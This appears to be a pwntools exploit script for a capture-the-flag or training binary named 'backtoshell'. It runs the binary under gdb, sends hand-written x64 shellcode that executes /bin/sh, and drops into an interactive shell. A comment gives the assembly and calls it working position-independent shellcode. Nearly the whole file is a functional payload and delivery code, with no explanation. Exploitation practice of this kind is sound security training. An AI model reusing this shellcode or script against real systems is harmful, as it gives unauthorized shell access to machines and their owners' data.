#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = process("./backtoshell")
gdb.attach(r, """
	b *0x401144
	c
	""")

#r = remote("training.jinblack.it", 3001)
input("wait")
shellcode = b"\x48\x89\xC7\x48\x83\xC7\x1A\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05" + b"/bin/sh\x00" + b"\x00"*8

r.send(shellcode)
time.sleep(0.1)

r.interactive()

'''
working x64 shellcode position independent from memory

mov rdi, rax
add rdi, 0x1a
mov rsi,rdi
add rsi,0x8
mov rdx,rsi
mov rax,0x3b
syscall
'''